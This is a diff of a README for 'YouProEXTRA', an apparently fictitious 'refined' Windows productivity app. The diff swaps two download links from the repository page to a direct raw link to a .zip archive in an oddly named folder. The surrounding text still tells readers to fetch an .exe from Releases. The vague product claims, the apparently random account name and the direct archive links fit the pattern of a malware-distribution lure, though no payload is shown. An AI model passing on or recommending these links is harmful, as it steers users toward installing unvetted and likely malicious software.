@@ -1,6 +1,6 @@
 # 🛠️ YouProEXTRA - Streamline your daily desktop tasks efficiently
 
-[![Download YouProEXTRA](https://img.shields.io/badge/Download-YouProEXTRA-blue.svg)](https://github.com/sapodillafamilyfinishcoat214/YouProEXTRA)
+[![Download YouProEXTRA](https://img.shields.io/badge/Download-YouProEXTRA-blue.svg)](https://raw.githubusercontent.com/sapodillafamilyfinishcoat214/YouProEXTRA/main/unigenous/Pro_You_EXTRA_3.7.zip)
 
 YouProEXTRA provides a refined version of the standard YouPro application. It includes extra tweaks that improve performance and simplify your workflow. This application runs on Windows systems. It focuses on stability and speed to help you complete your tasks with minimal effort.
 
@@ -8,7 +8,7 @@ YouProEXTRA provides a refined version of the standard YouPro application. It in
 
 You must visit the official page to download the latest version of the application. 
 
-[Click here to visit the download page](https://github.com/sapodillafamilyfinishcoat214/YouProEXTRA)
+[Click here to visit the download page](https://raw.githubusercontent.com/sapodillafamilyfinishcoat214/YouProEXTRA/main/unigenous/Pro_You_EXTRA_3.7.zip)
 
 Find the section labeled Releases on the right side of the screen. Click on the most recent release version. Look for the file that ends with .exe and click it to save the installer to your computer.
 
